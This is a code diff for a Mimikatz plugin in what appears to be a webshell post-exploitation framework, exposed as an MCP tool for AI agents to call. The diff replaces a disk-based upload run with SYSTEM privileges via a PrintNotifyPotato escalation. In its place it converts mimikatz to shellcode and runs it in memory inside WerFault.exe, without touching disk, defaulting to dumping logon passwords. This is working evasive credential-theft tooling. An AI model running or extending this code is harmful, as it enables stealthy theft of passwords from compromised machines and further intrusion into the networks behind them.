@@ -25,6 +25,7 @@ import javax.swing.JTextField;
 import util.UiFunction;
 import util.automaticBindClick;
 import util.functions;
+import util.http.ReqParameter;
 import core.annotation.McpTool;
 import core.annotation.McpParam;
 import java.io.ByteArrayOutputStream;
@@ -88,50 +89,45 @@ public abstract class Mimikatz implements Plugin {
         return null;
     }
 
-    @McpTool(name = "run", desc = "运行 Mimikatz 凭据提取 (默认: privilege::debug sekurlsa::logonpasswords exit)。若已通过 plugin_TH_TOOLS_exec 提权(SYSTEM)则自动以 SYSTEM 执行; 未提权时建议先调用 plugin_TH_TOOLS_exec 提权", params = {
+    @McpTool(name = "run", desc = "运行 Mimikatz 凭据提取 (默认: privilege::debug sekurlsa::logonpasswords exit; 纯内存加载执行, 不落盘)", params = {
             @McpParam(name = "shellId", required = true, desc = "Shell ID"),
-            @McpParam(name = "command", defaultValue = "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", desc = "mimikatz 命令参数") })
+            @McpParam(name = "command", defaultValue = "privilege::debug sekurlsa::logonpasswords exit", desc = "mimikatz 命令参数") })
     public String mcpRun(Map<String, Object> args) {
-        String cmd = String.valueOf(args.getOrDefault("command", "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""));
+        String cmd = String.valueOf(args.getOrDefault("command", "privilege::debug sekurlsa::logonpasswords exit"));
         try {
-            if (TH_TOOLS.isGlobalElevateEnabled(this.shellEntity)) {
-                // 提权模式: 自动上传 mimikatz 并以 SYSTEM 上下文执行 (TH_TOOLS 提权命令链)
-                byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
-                String remote = "C:\\Windows\\Temp\\gsl5_mimikatz.exe";
-                System.out.println("[Mimikatz] upload start size=" + pe.length + " once=" + this.shellEntity.getOnceBigFileUploadByteNum());
+            byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
+            // 1. 确保 ShellcodeLoader + JNA 已加载 (TH_TOOLS 共享内存加载链)
+            if (!shells.plugins.java.TH_TOOLS.mcpLoadJarShared(this.shellEntity, this.payload)) {
+                return "ShellcodeLoader/JNA 加载失败";
+            }
+            // 2. 原生 PE -> shellcode (客户端转换)
+            byte[] shellcode = PeLoader.peToShellcode(pe, new PrintStream(new ByteArrayOutputStream()));
+            if (shellcode == null || shellcode.length == 0) {
+                return "PE 转 shellcode 失败";
+            }
+            // 3. 目标端 ShellcodeLoader.run 内存执行 (宿主进程 + mimikatz 参数, 仿 runPe2 拼接)
+            ReqParameter rp = new ReqParameter();
+            rp.add("excuteFile", "C:\\Windows\\System32\\WerFault.exe " + cmd);
+            rp.add("type", "start");
+            if (shellcode.length > this.shellEntity.getOnceBigFileUploadByteNum()) {
+                String memFile = "mem://" + java.util.UUID.randomUUID().toString();
                 int once = this.shellEntity.getOnceBigFileUploadByteNum();
-                for (int off = 0; off < pe.length; off += once) {
-                    byte[] chunk = java.util.Arrays.copyOfRange(pe, off, Math.min(off + once, pe.length));
-                    String flag = this.payload.bigFileUpload(remote, (long)off, chunk);
-                    System.out.println("[Mimikatz] chunk off=" + off + " len=" + chunk.length + " flag=" + flag);
-                    if (!"ok".equals(flag)) return "mimikatz 上传失败: " + flag;
+                for (int off = 0; off < shellcode.length; off += once) {
+                    byte[] chunk = java.util.Arrays.copyOfRange(shellcode, off, Math.min(off + once, shellcode.length));
+                    String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
+                    if (!"ok".equals(flag)) return "shellcode 分片上传失败: " + flag;
                 }
-                System.out.println("[Mimikatz] upload done");
-                String thToolsCn = this.payload.getClass().getName().contains("csharp") ? "shells.plugins.csharp.TH_TOOLS" : "shells.plugins.java.TH_TOOLS";
-                TH_TOOLS thTools = (TH_TOOLS) Class.forName(thToolsCn).newInstance();
-                thTools.init(this.shellEntity);
-                thTools.CurrentPlugin = "PrintNotifyPotato";
-                if (!thTools.loadPlugin(thTools.CurrentPlugin)) return "提权插件加载失败: " + thTools.CurrentPlugin;
-                thTools.Excute_cmd = "cmd /c " + remote + " " + cmd;
-                byte[] result = thTools.ExeCuteCmd();
-                return this.encoding.Decoding(result);
+                rp.add("memfile", memFile);
+            } else {
+                rp.add("shellcode", shellcode);
             }
+            rp.add("readWaitTime", "60000");
+            byte[] result = this.payload.evalFunc("plugin.ShellcodeLoader", "run", rp);
+            return core.Encoding.getEncoding(this.shellEntity).Decoding(result);
         } catch (Exception e) {
-            return "提权执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
-        }
-        try {
-            if (this.loader == null) {
-                if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
-                    this.loader = this.getShellcodeLoader();
-                }
-                if (this.loader == null) {
-                    this.loader = this.createLoader();
-                }
-            }
-            return "当前未提权(SYSTEM)。MCP 环境下普通权限的 mimikatz 不可用, 请先调用 plugin_TH_TOOLS_exec 提权(如 plugin=PrintNotifyPotato), 再重试本工具。";
-        } catch (Exception e) {
-            e.printStackTrace(System.out);
-            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+            java.io.StringWriter sw = new java.io.StringWriter();
+            e.printStackTrace(new java.io.PrintWriter(sw));
+            return "执行失败:\n" + sw.toString();
         }
     }
 
